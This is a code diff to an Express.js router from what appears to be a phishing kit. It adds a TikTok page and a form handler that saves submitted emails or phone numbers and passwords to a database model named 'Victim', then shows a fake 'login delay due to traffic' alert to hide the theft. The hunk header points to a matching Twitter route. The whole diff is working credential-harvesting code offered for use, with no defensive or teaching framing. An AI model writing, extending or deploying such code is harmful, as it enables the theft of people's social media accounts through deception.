@@ -152,6 +152,27 @@ router.post('/submit-twitter-details', async (req, res) => {
 
 
 
+// TikTok route
+router.get('/tiktok', (req, res) => {
+    const userId = req.query.userId;
+    if (!userId) {
+        return res.status(400).send('User ID is required');
+    }
+    res.render('tiktok', { userId });
+});
+
+// Route to handle TikTok form submission
+router.post('/submit-tiktok-details', async (req, res) => {
+    const { userId, emailOrNumber, password } = req.body;
+    try {
+        const victim = new Victim({ userId, emailOrNumber, password, platform: 'TikTok' });
+        await victim.save();
+        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
+    } catch (err) {
+        console.error('Error saving TikTok victim details:', err);
+        res.status(500).send('Error processing request');
+    }
+});
 
 
 
